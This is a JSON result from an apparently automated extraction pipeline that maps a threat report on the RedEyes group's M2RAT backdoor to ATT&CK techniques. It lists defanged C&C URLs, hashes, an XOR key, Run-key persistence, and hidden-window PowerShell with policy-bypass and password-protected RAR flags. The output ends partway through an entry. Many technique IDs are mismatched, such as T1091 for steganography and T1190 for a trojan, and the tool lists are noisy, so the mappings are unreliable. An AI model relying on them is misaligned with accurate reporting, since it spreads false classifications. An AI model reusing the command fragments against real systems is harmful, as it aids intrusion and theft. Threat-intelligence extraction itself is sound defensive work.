{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 52,
      "langchain_extractions": 3,
      "high_confidence_ttps": 0,
      "processing_time_ms": 9098.776000000002
    },
    "extraction_results": [
      {
        "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
        "extracted_ttps": [
          {
            "ttp_id": "3b7476bd-489c-4da2-83ad-1cef12d37369",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Shared Memory",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "M2RAT creates a shared memory section to execute commands from the threat actor's server",
            "confidence_score": 0.739,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "shared memory"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f559214e-3b38-46b2-a4b5-96a0de70cf6b",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Steganography",
            "attack_id": "T1091",
            "tactic": "Defense Evasion",
            "description": "The threat actor used steganography to embed malware within an image file",
            "confidence_score": 0.738,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "wallup.net",
              "JPEG image file",
              "XOR key: FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "Steganography tool",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cf50d4fe-5d77-4fdc-b0b9-01462057044f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "MSHTA",
            "attack_id": "T1170",
            "tactic": "Execution",
            "description": "The threat actor used mshta to execute an HTA file containing JavaScript code",
            "confidence_score": 0.736,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "mshta.exe",
              "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c41fae42-2f07-4d24-bab8-0f03ce91002a",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Autorun Registration",
            "attack_id": "T1060",
            "tactic": "Persistence",
            "description": "The RedEyes group used the RUN key command for autorun registration to establish a consistent connection with the C&C server",
            "confidence_score": 0.724,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RUN key command"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4cd8f8db-9bf3-4798-94ba-c125c88d4ff4",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "M2RAT's C&C communications command system involves receiving commands from the threat actor's server through the POST method's Body",
            "confidence_score": 0.723,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?R=[BASE64-encoded]",
              "hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?U=[Computer Name]+[Username]"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0efcb11f-8feb-46ca-a007-cd87167ab9d6",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The RedEyes group exfiltrated PC information and mobile phone data of their targets",
            "confidence_score": 0.721,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PC information",
              "Mobile phone data"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "501d52b9-0d49-4c9d-8e77-4d7dd6028730",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Steganography",
            "attack_id": "T1091",
            "tactic": "Defense Evasion",
            "description": "The RedEyes group used steganography to hide malware in images",
            "confidence_score": 0.72,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Steganography technique"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "Steganography tool",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2e5022bb-149b-4b79-bedf-b642b8f5bbaa",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "The RedEyes group used PowerShell to steal PC information and remote control systems",
            "confidence_score": 0.72,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7baa8895-a7dd-49b0-8f06-b0ca97599a93",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Compression",
            "attack_id": "T1005",
            "tactic": "Exfiltration",
            "description": "Compressing files with Winrar (RAR.exe) for exfiltration",
            "confidence_score": 0.715,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 1.0,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RAR.exe",
              "%TEMP%\\Y_%m_%d_%H_%M_%S",
              "hwp",
              "doc",
              "docx",
              "xls",
              "xlsx",
              "ppt",
              "pptx",
              "cell",
              "csv",
              "show",
              "hsdt",
              "mp3",
              "amr",
              "3gp",
              "m4a",
              "txt",
              "png",
              "jpg",
              "jpeg",
              "gif",
              "pdf",
              "eml"
            ],
            "tools": [
              "reg",
              "ping",
              "Winrar",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b5bde009-2ab2-4b2b-9b93-5a15aeddc1ce",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Control",
            "attack_id": "T1094",
            "tactic": "Command and Control",
            "description": "The RedEyes group used the newly identified M2RAT malware to carry out C&C commands",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "M2RAT malware",
              "Shared memory section"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c59fb50b-21d5-43d4-88a8-b71595b7d23d",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Keylogging",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "The M2RAT backdoor includes keylogging features",
            "confidence_score": 0.706,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogging data"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ea8dd512-3b9e-4e19-b268-3ab9874d2af4",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Steganography",
            "attack_id": "T1091",
            "tactic": "Defense Evasion",
            "description": "Attacker used steganography in JPEG files",
            "confidence_score": 0.706,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "93c66ee424daf4c5590e21182592672e"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "Steganography JPEG",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "18eb44e6-4b76-4da4-a8f4-305c8a04e9a7",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Infostealer",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "Attacker used Infostealer/Win.Phone.C5381667 for mobile phone data theft",
            "confidence_score": 0.698,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "7f5a72be826ea2fe5f11a16da0178e54"
            ],
            "tools": [
              "Infostealer/Win.Phone.C5381667",
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "12008d8a-8756-4f4d-945c-734c30091104",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "The threat actor registered a command to the registry Run key to establish a persistent connection",
            "confidence_score": 0.695,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              "RyPO",
              "c:\\windows\\system32\\cmd.exe /c PowerShell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a4a29854-b55f-4b44-b869-7d5d66cde2c9",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Obfuscation",
            "attack_id": "T1001",
            "tactic": "Defense Evasion",
            "description": "Threat actor uses steganography technique to evade network detection by hiding command info in the Body of the POST",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "steganography",
              "POST request"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c5c1a8d3-0535-4aad-bb31-860c60224402",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Attacker used PowerShell for execution",
            "confidence_score": 0.692,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cf680435-9373-4d62-9793-41857d8a9731",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The threat actor exploited a vulnerability in the EPS processing module to execute shellcode",
            "confidence_score": 0.688,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CVE-2017-8291",
              "Form.hwp",
              "EPS file"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "dbaa6b49-038e-4ae4-9a69-45a6a42b578a",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The threat actor used PowerShell to execute commands and download additional malware",
            "confidence_score": 0.687,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PowerShell.exe",
              "-WindowStyle hidden",
              "-NoLogo",
              "-NonInteractive",
              "-ep bypass"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "66983c65-2c78-45f1-a62b-2a0b1486a798",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Persistence-related Powershell code",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "49e5dc2c-4706-4407-ab33-883c316f9b0a",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "df00da9b-a60e-459d-8e87-4b68029e3146",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The CMD command is transmitted through the shared memory to execute remote control commands",
            "confidence_score": 0.682,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CMD",
              "shared memory"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "Chinotto malware",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a535d520-d18c-431c-af7c-3fda82a9b20d",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Trojan",
            "attack_id": "T1190",
            "tactic": "Execution",
            "description": "Attacker used Trojan/Win.Loader.C5359534",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "7bab405fbc6af65680443ae95c30595d"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "Trojan/Win.Loader.C5359534",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "eea1f088-8bc3-40e4-880a-d8f64a4e75b5",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Downloader",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "Attacker used Downloader/PS.Generic.SC185661",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "9083c1ff01ad8fabbcd8af1b63b77e66"
            ],
            "tools": [
              "reg",
              "ping",
              "Downloader/PS.Generic.SC185661",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d1579ab7-d918-49fa-ac6e-38c8c5ab9ec0",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Defense Evasion",
            "description": "The threat actor encoded the CMD command in BASE64 before sending it to the affected host",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BASE64 encoding"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1764d539-314d-4a4e-9b2c-76ca93a77313",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Exfiltration",
            "description": "The command execution result is encoded in BASE64 before sending it to the threat actor's server",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BASE64-encoded"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2309b53e-4ff6-457d-941a-1ff0b5d4c3b0",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Download Malware-Tools",
            "attack_id": "T1215",
            "tactic": "Defense Evasion",
            "description": "The threat actor downloaded an image file containing malware from the threat actor's server",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "JPEG image file",
              "hxxps://www.*****elearning.or[.]kr/popup/handle/1.html"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d70e0a25-9c9f-4d9f-bdc1-a432539bcedd",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Exfiltration",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The M2RAT backdoor sends keylogging data and screenshot logs to the threat actor's server",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogging data",
              "screenshot logs"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ce88e90a-7c53-454a-955e-d66e3d4e65b0",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Remote Access Tools",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "M2RAT establishes remote control command by transmitting CMD commands from the threat actor's server",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "M2RAT",
              "CMD commands"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "326b767a-85a0-4732-accb-d3a5fd07be2f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploitation of Vulnerability",
            "attack_id": "T1204",
            "tactic": "Initial Access",
            "description": "The RedEyes group exploited the HWP EPS vulnerability (CVE-2017-8291) to distribute malware",
            "confidence_score": 0.675,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CVE-2017-8291",
              "HWP EPS vulnerability",
              "Form.hwp"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "HWP",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "19dcd412-a422-4635-87d9-afbc0276018f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "The threat actor created a new process (lskdjfel.exe) in the %temp% path",
            "confidence_score": 0.669,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.314,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%temp%\\lskdjfel.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b27a724e-6dcf-45c5-acb1-ae09cd184711",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Exfiltration",
            "description": "Archiving collected data with password protection",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RAR.exe",
              "-df",
              "-r",
              "-hp",
              "-m1"
            ],
            "tools": [
              "reg",
              "ping",
              "Winrar",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2081442b-6650-4d60-9f66-1411162543ed",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1048",
            "tactic": "Exfiltration",
            "description": "Exfiltrating data to the threat actor's server",
            "confidence_score": 0.658,
            "confidence_level": "medium",
